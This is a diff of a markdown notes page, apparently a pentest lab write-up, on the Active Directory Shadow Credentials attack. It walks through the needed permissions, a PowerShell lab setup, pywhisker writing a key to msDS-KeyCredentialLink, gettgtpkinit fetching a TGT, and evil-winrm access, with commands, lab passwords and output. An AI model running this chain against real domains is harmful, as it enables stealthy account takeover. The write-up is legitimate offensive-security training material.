@@ -1,13 +1,18 @@
+# Shadow Credentials
+
 For this we will first need write permissions over the `msDS-KeyCredentialLink` attribute of the victim account. This occurs when we have:
+
 ```cpp
 GenericWrite      → over the victim account
 GenericAll        → over the victim account
 WriteProperty     → specifically over msDS-KeyCredentialLink
 Owns the object   → you are the owner of the object
 ```
+
 These misconfigured permissions are more common than they seem, especially on service accounts or when an admin delegates control over an OU without being granular.
 
 It is based on Windows Hello for Business / PKINIT, a legitimate AD feature that allows authentication with a public/private key pair instead of a password. AD stores the public key in the `msDS-KeyCredentialLink` attribute of the object
+
 ```cpp
 1. You have GenericWrite over "s.vim"
          ↓
@@ -21,7 +26,9 @@ It is based on Windows Hello for Business / PKINIT, a legitimate AD feature that
          ↓
 6. With that TGT you can do U2U (User-to-User) and obtain the NTLM hash of s.vim
 ```
-#### Why it is especially stealthy
+
+**Why it is especially stealthy**
+
 ```cpp
 Does not change the user's password    → the user keeps logging in normally
 Does not create new accounts           → nothing suspicious in the logs
@@ -29,14 +36,20 @@ Does not modify groups                 → no visible changes in memberships
 The victim account works               → nobody notices anything
 normally
 ```
+
 The only trace is the modification of the `msDS-KeyCredentialLink` attribute, which many environments do not audit
-### Important requirement
+
+#### Important requirement
+
 The important requirement for this attack is that the DC needs a valid certificate, specifically that AD CS (Active Directory Certificate Services) is configured. Without AD CS the KDC cannot process PKINIT authentication and the attack does not work
+
 ```powershell
 Get-ADObject -Filter {objectClass -eq "pKIEnrollmentService"} `
  -SearchBase "CN=Configuration,DC=burned,DC=corp"
 ```
-#### PKINIT authentication flow
+
+**PKINIT authentication flow**
+
 ```cpp
 1. Client generates a structure called AuthPack
    containing a timestamp and client data
@@ -59,6 +72,7 @@ Get-ADObject -Filter {objectClass -eq "pKIEnrollmentService"} `
 ```
 
 Let's quickly create a "Lab" with this script in PowerShell:
+
 ```powershell
 $victim = "svc_mssql"
 $delegate = "s.vim"
@@ -78,8 +92,10 @@ $rule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
 $acl.AddAccessRule($rule)
 Set-Acl "AD:$victimDN" $acl
 ```
+
 Of course, what we need to do now is generate a `Private/Public` key pair, modify the `msDS-KeyCredentialLink` attribute of the `as.rep` account to point to our `Public Key` and log in via PKINIT. Let's try it
-- Now let's install PyWhisker: https://github.com/ShutdownRepo/pywhisker and run it:
+
+* Now let's install PyWhisker: https://github.com/ShutdownRepo/pywhisker and run it:
 
 ```cpp
 svim @Burned in Desktop/burned/nmap ❯ python3 pywhisker/pywhisker/pywhisker.py -t "as.rep" -u 's.vim' -p 'snake123' -d 'BURNED.CORP' -k -a 'add' --filename keys/
@@ -110,7 +126,9 @@ pywhisker did:
    - keys/_cert.pem → only the X.509 certificate in plain text
    - YAcQR7eBXfC5DE6t7aEF → password to decrypt the PFX
 ```
+
 For the next step `gettgtpkinit` we only need the PFX and the password, which has everything needed inside
+
 ```cpp
 svim @Burned in PKINITtools on  master ❯ python3 gettgtpkinit.py 'BURNED.CORP'/'as.rep' -cert-pfx ../keys/.pfx -pfx-pass 'YAcQR7eBXfC5DE6t7aEF' -dc-ip '192.168.20.52' as.rep.ccache
 2026-06-10 01:08:50,782 minikerberos INFO     Loading certificate and key from file
@@ -119,7 +137,9 @@ svim @Burned in PKINITtools on  master ❯ python3 gettgtpkinit.py 'BURNED.CORP'
 2026-06-10 01:08:50,819 minikerberos INFO     6848d75f2b162ec96c43b98c5c462cbc185cbb9cfd2cdbf4d791bb68746e1252
 2026-06-10 01:08:50,827 minikerberos INFO     Saved TGT to file
 ```
+
 We would have the TGT. We simply export it in our `KRB5CCNAME` environment variable:
+
 ```c
 svim @Burned in PKINITtools on  master ❯ export KRB5CCNAME=as.rep.ccache
 svim @Burned in PKINITtools on  master ❯ klist
@@ -129,16 +149,19 @@ Default principal: as.rep@BURNED.CORP
 Valid starting       Expires              Service principal
 06/10/2026 01:08:51  06/10/2026 11:08:51  krbtgt/BURNED.CORP@BURNED.CORP
 ```
+
 And we would have a `ccache` of the `as.rep` user to authenticate via `Kerberos`. We simply configure `/etc/krb5.conf`:
 
-![krb5](images/krb5conf.png)
+![krb5](../../.gitbook/assets/krb5conf.png)
 
 And we log in with `Evil-WinRM`:
+
 ```cpp
 svim @Burned in PKINITtools on  master ❯ evil-winrm -i 192.168.20.52 -r BURNED.CORP -K as.rep.ccache
 ...
 *Evil-WinRM* PS C:\Users\as.rep\Documents>
 ```
+
 (It is not necessary to export the `.ccache` in `KRB5CCNAME`)
 
 And this would be `ShadowCredentials`.
